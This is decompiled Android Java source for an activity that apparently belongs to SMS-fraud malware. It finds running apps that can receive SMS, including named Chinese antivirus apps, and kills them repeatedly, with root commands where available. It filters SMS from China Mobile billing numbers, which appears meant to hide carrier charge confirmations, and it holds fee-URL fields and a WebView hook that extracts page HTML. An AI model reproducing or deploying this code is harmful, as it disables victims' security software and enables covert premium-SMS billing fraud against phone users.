// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
package com.webtest.sessiontest;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Set;
import org.apache.http.client.CookieStore;
import org.apache.http.impl.client.DefaultHttpClient;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.TextView;
import com.webtest.sessiontest2.R;

// Referenced classes of package com.webtest.sessiontest:
//            ChangeAPN, Api
@SuppressLint("NewApi")
public class SessionTestActivity extends Activity {
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.main);
        final TextView tv = ((TextView) findViewById(R.id.main_response_txt));
        ((Button) findViewById(R.id.killapp)).setOnClickListener(new android.view.View.OnClickListener() {
            public void onClick(View view) {
                try {
                    tv.setText(SessionTestActivity.killapp(SessionTestActivity.this, false));
                } catch (Exception e) {
                    tv.setText(e.getMessage());
                }
            }
        });
        ((Button) findViewById(R.id.listapp)).setOnClickListener(new android.view.View.OnClickListener() {
            public void onClick(View view) {
                try {
                    tv.setText(sortActSMS());
                } catch (Exception e) {
                    tv.setText(e.getMessage());
                }
            }
        });
        ScreenOffReceiver receiver=new ScreenOffReceiver();
        IntentFilter intentfilter = new IntentFilter();
        intentfilter.addAction("android.intent.action.SCREEN_OFF");
        registerReceiver(receiver, intentfilter);
    }
    final class InJavaScriptLocalObj {
        public void showSource(String s) {}
    }
    class MyWebViewClient extends WebViewClient {
        public void onPageFinished(WebView webview, String s) {
            if (progerss.isShowing()) progerss.dismiss();
            webview.loadUrl("javascript:window.local_obj.showSource('<head>'+document.getElementsByTagName('html')[0].innerHTML+'</head>');");
            super.onPageFinished(webview, s);
        }
        public void onPageStarted(WebView webview, String s, Bitmap bitmap) {
            Log.d("WebView", "onPageStarted");
            super.onPageStarted(webview, s, bitmap);
        }
        public boolean shouldOverrideUrlLoading(WebView webview, String s) {
            webview.loadUrl(s);
            return true;
        }
    }
    class ONEITEM {
        String FeeURL;
        int downSize;
        int inner;
        int itemIndex;
        String leftTag;
        String rightTag;
    }
    public SessionTestActivity() {
        error = "";
        TAG = "test";
        itemList = new ArrayList<Object>();
        downLinkList = new ArrayList<Object>();
        tag = "sessionTest";
        feeItemURL = "";
        itemIndex = 0;
    }
    public static boolean KillPID(int i) {
        boolean flag;
        try {
            LineNumberReader linenumberreader = new LineNumberReader(new InputStreamReader(Runtime.getRuntime().exec("ls").getInputStream()));
            do {
                String s = linenumberreader.readLine();
                if (s == null) {
                    flag = true;
                    break;
                }
                Log.w("test", s);
            } while (true);
        } catch (Exception exception) {
            Log.d("*** DEBUG ***", (new StringBuilder("Unexpected error - Here is what I know: ")).append(exception.getMessage()).toString());
            flag = false;
        }
        return flag;
    }
    public static Entry<Integer, String>[] getSortedHashtableByKey(Hashtable<Integer, String> hashtable) {
        Set<Entry<Integer, String>> set = hashtable.entrySet();
        Entry<Integer, String> aentry[] = (Entry<Integer, String>[]) set.toArray(new java.util.Map.Entry[set.size()]);
        Arrays.sort(aentry, new Comparator<Entry<Integer, String>>() {
            @Override
            public int compare(Entry<Integer, String> obj, Entry<Integer, String> obj1) {
                Integer obj2 = obj.getKey();
                Integer obj3 = obj1.getKey();
                return obj2.compareTo(obj3);
            }
        });
        return aentry;
    }
    private void initProgress() {
        progerss = ProgressDialog.show(this, "", "加载中，请稍候...", false, true, new android.content.DialogInterface.OnCancelListener() {
            public void onCancel(DialogInterface dialoginterface) {
                mWebView.stopLoading();
            }
        });
    }
    private void initWebView() {
        settings = mWebView.getSettings();
        settings.setLoadsImagesAutomatically(true);
        settings.setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(new InJavaScriptLocalObj(), "local_obj");
        settings.setCacheMode(2);
        CookieManager.getInstance().setAcceptCookie(true);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setScrollBarStyle(0);
        mWebView.setWebViewClient(new MyWebViewClient());
        mWebView.setDownloadListener(new DownloadListener() {
            public void onDownloadStart(String s, String s1, String s2, String s3, long l) {
                Log.i("test", "downLoad");
                Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(s));
                startActivity(intent);
            }
        });
    }
    public static String killapp(Context context, boolean isRoot) {
        String s2;
        String s = "";
        String s1 = "";
        try {
            ActivityManager activitymanager = (ActivityManager) context.getSystemService("activity");
            PackageManager packagemanager = context.getApplicationContext().getPackageManager();
            StringBuilder stringbuilder = new StringBuilder();
            for (RunningAppProcessInfo info : activitymanager.getRunningAppProcesses()) {
                String processName = info.processName;
                if (processName.equals("com.assistant") || processName.equals("com.android.speeder")) continue;
                for (String pkgName : info.pkgList) {
                    try {
                        if (packagemanager.checkPermission("android.permission.RECEIVE_SMS", pkgName) == 0) {
                            s1 = s1 + info.pid + ";" + info.uid + ";" + pkgName + "\n";
                            if (info.uid >= 10000) {
                                s = s + info.pid + ";" + info.uid + ";" + pkgName + "\n";
                                //runCommand("kill " + info.pid);
                               // if (isRoot) {
                                    Api.runScriptAsRoot(context, "kill " + info.pid, stringbuilder);
                               // } 
                                //else 
                                int count=2;
                                if(pkgName.contains("360")) count=50;
                                for (int i = 0; i < count; i++){
                                    android.os.Process.killProcess(info.pid);
                                    activitymanager.killBackgroundProcesses(pkgName);
                                }
                            }
                        }
                    } catch (Exception e) {
                        s = s + "Rootkillapp.java killapp() error:" + e.getMessage();
                    }
                }
            }
            s2 = s1 + "========\n" + s;
        } catch (Exception e) {
            s2 = "Rootkillapp.java killapp() error:" + e.getMessage();
        }
        return s2;
    }
    public static int runCommand(String command) {
        int result = -1;
        Process process = null;
        DataOutputStream stream = null;
        try {
            process = Runtime.getRuntime().exec(command + "\n");
            stream = new DataOutputStream(process.getOutputStream());
            stream.flush();
            result = process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (stream != null) {
                try {
                    stream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                process.destroy();
            }
        }
        return result;
    }
    public static int runRootCommand(String command) {
        int result = -1;
        Process process = null;
        DataOutputStream stream = null;
        try {
            process = Runtime.getRuntime().exec("su");
            stream = new DataOutputStream(process.getOutputStream());
            stream.writeBytes(command + "\n");
            stream.writeBytes("exit\n");
            stream.flush();
            result = process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (stream != null) {
                try {
                    stream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                process.destroy();
            }
        }
        return result;
    }
    private String sortActSMS() {
        StringBuilder result = new StringBuilder();
        if (processSMSandFilter("102+8610086001", "中国移动;")) result.append("block\n");
        Hashtable<Integer, String> hashtable = new Hashtable<Integer, String>();
        List<RunningAppProcessInfo> list = ((ActivityManager) getSystemService("activity")).getRunningAppProcesses();
        PackageManager packagemanager = getApplicationContext().getPackageManager();
        Iterator<RunningAppProcessInfo> iterator = list.iterator();
        while (iterator.hasNext()) {
            RunningAppProcessInfo info = iterator.next();
            for (String packageName : info.pkgList) {
                if (packagemanager.checkPermission("android.permission.RECEIVE_SMS", packageName) == PackageManager.PERMISSION_GRANTED && info.uid >= 10000) {
                    hashtable.put(info.pid, info.uid + ";" + info.importance + ";" + packageName);
                }
            }
        }
        for (Entry<Integer, String> entry : getSortedHashtableByKey(hashtable)) {
            result.append("pid:").append(entry.getKey()).append(";").append(entry.getValue()).append("\n").toString();
        }
        return result.toString();
    }
    public String GetHighApp(Context context) {
        String s = "";
        PackageManager packagemanager;
        String s1;
        List<RunningAppProcessInfo> list = ((ActivityManager) context.getSystemService("activity")).getRunningAppProcesses();
        packagemanager = context.getApplicationContext().getPackageManager();
        List<PackageInfo> list1 = packagemanager.getInstalledPackages(0);
        s1 = new String(";");
        Iterator<PackageInfo> iterator = list1.iterator();
        //_L7:
        while (iterator.hasNext()) {
            PackageInfo packageinfo = (PackageInfo) iterator.next();
            if (isUserApp(packageinfo.applicationInfo)) s1 = (new StringBuilder(String.valueOf(s1))).append(packageinfo.packageName.toLowerCase()).append(";").toString();
        }
        //_L1:
        String s2 = new String(";com.snda.youni;com.nqmobile.antivirus20;com.qihoo360.mobilesafe;com.lbe.security;com.tencent.qqpimsecure;com.ijinshan.mguard;");
        Iterator<RunningAppProcessInfo> iterator1 = list.iterator();
        //_L9:
        int i = 0;
        while (iterator1.hasNext()) {//goto _L4; else goto _L3
            // _L4:
            android.app.ActivityManager.RunningAppProcessInfo runningappprocessinfo = (android.app.ActivityManager.RunningAppProcessInfo) iterator1.next();
            if (runningappprocessinfo.processName.equalsIgnoreCase("com.assistant")) {
                //L8_L8:
                i = runningappprocessinfo.pid;
                break;
            }
        }
        //_L3:
        Iterator<RunningAppProcessInfo> iterator2 = list.iterator();
        //_L11:
        while (iterator2.hasNext()) {//goto _L6; else goto _L5
            //  _L6:
            android.app.ActivityManager.RunningAppProcessInfo runningappprocessinfo1;
            String as[];
            int j;
            runningappprocessinfo1 = (android.app.ActivityManager.RunningAppProcessInfo) iterator2.next();
            as = runningappprocessinfo1.pkgList;
            j = 0;
            //_L15:
            while (j < as.length) {
                // _L10:
                if (!(runningappprocessinfo1.pid >= i || packagemanager.checkPermission("android.permission.RECEIVE_SMS", as[j]) != 0 || s2.indexOf((new StringBuilder(";")).append(as[j].toLowerCase()).append(";").toString()) == -1
                        && s1.indexOf((new StringBuilder(";")).append(as[j].toLowerCase()).append(";").toString()) == -1)) {
                    //L12_L12:
                    list1.clear();
                    list.clear();
                    s = as[j];
                    return s;
                }
                //L13_L13:
                j++;
                // goto _L15
            }
            //L11
        }
        //_L5:
        list1.clear();
        list.clear();
        //_L14:
        return s;
    }
    public boolean isUserApp(ApplicationInfo applicationinfo) {
        boolean flag = false;
        int j;
        int i = 0x80 & applicationinfo.flags;
        if (i != 0) { return true; }
        j = applicationinfo.flags;
        int k = j & 1;
        if (k == 0) return true;
        return flag;
    }
    public boolean processSMSandFilter(String s, String s1) {
        String s2 = s.replace("+86", "");
        String as[] = "10086;1065".split(";");
        int i = 0;
        int j = as.length;
        boolean flag = false;
        while (i < j) {
            if (!(as[i].equals("") || s2.indexOf(as[i]) != 0)) {
                flag = true;
                break;
            }
            i++;
        }
        //_L1:
        if (!flag) return flag;
        //_L3:
        String as1[];
        int k;
        as1 = "移;09".split(";");
        k = 0;
        //_L8:
        int l = as1.length;
        flag = false;
        while (k < l) {
            if (!(!as1[k].equals("") && s1.indexOf(as1[k]) == -1)) {
                flag = true;
                break;
            }
            k++;
        }
        //_L4:
        return flag;
    }
    private String TAG;
    ArrayList downLinkList;
    private String error;
    String feeItemURL;
    DefaultHttpClient httpClient;
    int itemIndex;
    ArrayList itemList;
    CookieStore mCookieStore;
    private WebView mWebView;
    private ProgressDialog progerss;
    private WebSettings settings;
    String tag;
}
